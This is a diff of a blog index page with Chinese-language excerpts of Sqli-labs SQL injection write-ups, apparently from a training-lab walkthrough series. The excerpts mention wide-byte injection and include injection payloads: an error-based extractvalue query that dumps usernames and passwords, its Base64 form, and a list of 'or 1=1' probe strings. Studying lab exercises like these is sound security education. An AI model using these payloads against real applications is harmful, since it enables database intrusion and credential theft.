@@ -233,13 +233,13 @@
                 
                     <span>
                         <b class="iconfont icon-text2"></b> <i>Words count</i>
-                        5.1k
+                        4.9k
                     </span>
                 
                 
                     <span>
                         <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                        5 mins.
+                        4 mins.
                     </span>
                 
                 
@@ -250,15 +250,16 @@
         
         <div class="md-content animated fadeIn">
             
-                <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/31/Sqli-labs%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></p>
-<p>本关开始，考查的是<code>宽字节注入</code>的利用，关于宽字节注入的知识点可以看我的文章<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a>的<code>Tip 4</code> </p>
+                <p>本关开始，考查的是<code>宽字节注入</code>的利用，关于宽字节注入的知识点可以看我的文章Sqli-labs Tips的<code>Tip 4</code> </p>
 <p>我们提交以下payload时，发现<code>单引号&#39;</code>被转义了</p>
-<pre><code>?id=1&#39;
-</code></pre><p></p>
+<pre><code class="Code">?id=1&#39;
+</code></pre>
+<p></p>
 <p>查看源码，发现使用了<code>check_addslashes()</code>函数对id进行了处理</p>
-<pre><code>$id=check_addslashes($_GET[&#39;id&#39;]);
-</code></pre><p>看一下这个函数的功能，就是对<code>反斜杠</code>\、<code>单引号</code>‘、<code>双引号</code>“的过滤</p>
-<pre><code class="php">function check_addslash...</code></pre>
+<pre><code class="Code">$id=check_addslashes($_GET[&#39;id&#39;]);
+</code></pre>
+<p>看一下这个函数的功能，就是对<code>反斜杠</code>\、<code>单引号</code>‘、<code>双引号</code>“的过滤</p>
+<pre><code class="php">function check_addslashes($string)...</code></pre>
             
             <span class="read-more"><a href="/knlvre.github.io/2019/02/01/Sqli-labs 第31-40关/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
@@ -285,13 +286,13 @@
                 
                     <span>
                         <b class="iconfont icon-text2"></b> <i>Words count</i>
-                        11k
+                        10k
                     </span>
                 
                 
                     <span>
                         <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                        10 mins.
+                        9 mins.
                     </span>
                 
                 
@@ -302,8 +303,7 @@
         
         <div class="md-content animated fadeIn">
             
-                <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></p>
-<p>与<code>Less-20</code>类似，只是对变量<code>Cookiee</code>进行了<code>Base64</code>加密，并且使用单引号和括号进行包裹</p>
+                <p>与<code>Less-20</code>类似，只是对变量<code>Cookiee</code>进行了<code>Base64</code>加密，并且使用单引号和括号进行包裹</p>
 <p></p>
 <p>将<code>payload</code>进行加密</p>
 <p></p>
@@ -312,7 +312,10 @@
 <p>与前面关卡类似，只是对<code>$cookee</code>包括采用了<code>双引号</code></p>
 <p></p>
 <p><code>Base64</code>加密一下<code>payload</code>：</p>
-<pre><code>&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id...</code></pre>
+<pre><code class="Code">&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))#
+
+加密后：
+IiBhbmQgZXh0cmFj...</code></pre>
             
             <span class="read-more"><a href="/knlvre.github.io/2019/01/31/Sqli-labs 第21-30关/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
@@ -339,7 +342,7 @@
                 
                     <span>
                         <b class="iconfont icon-text2"></b> <i>Words count</i>
-                        16k
+                        15k
                     </span>
                 
                 
@@ -359,7 +362,7 @@
                 <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/29/Sqli-labs%20%E7%AC%AC1-10%E5%85%B3/">第1-10关Write-up</a></p>
 <p>之前其他资料学习过程中，学会一个挺好用的学习技巧</p>
 <p>在源码中<code>$sql</code>变量下方加入以下内容</p>
-<pre><code>echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;
+<pre><code class="Code">echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;
 echo $sql;
 echo &quot;&lt;br&gt;&quot;.&quot;=======================...</code></pre>
             
@@ -437,7 +440,7 @@ echo &quot;&lt;br&gt;&quot;.&quot;=======================...</code></pre>
                 
                     <span>
                         <b class="iconfont icon-text2"></b> <i>Words count</i>
-                        9.7k
+                        10k
                     </span>
                 
                 
@@ -455,7 +458,7 @@ echo &quot;&lt;br&gt;&quot;.&quot;=======================...</code></pre>
         <div class="md-content animated fadeIn">
             
                 <p>（1）简单的用于尝试的语句</p>
-<pre><code>or 1=1--+
+<pre><code class="Code">or 1=1--+
 &#39;or 1=1--+
 &quot;or 1=1--+
 )or 1=1--+
@@ -464,8 +467,9 @@ echo &quot;&lt;br&gt;&quot;.&quot;=======================...</code></pre>
 &quot;))or 1=1--+
 
 ps:--+和#可以互相替换
-</code></pre><p>（2）mysql命令行的简单命令</p>
-<pre><code>查看所有的数据库
+</code></pre>
+<p>（2）mysql命令行的简单命令</p>
+<pre><code class="Code">查看所有的数据库
 show databases;
 
 使用某个数据库(比如security数据库)
@@ -474,7 +478,7 @@ use security;
 查看我们使用的数据库中有哪些表
 show tables;
 
-看一下我们想要查看...</code></pre>
+看一下我们想要查...</code></pre>
             
             <span class="read-more"><a href="/knlvre.github.io/2019/01/28/Sqli-labs Tips/" title="Read article" class="posttitle">Read article</a> <b class="iconfont icon-arrow-right- gradient-text"></b></span>
         </div>
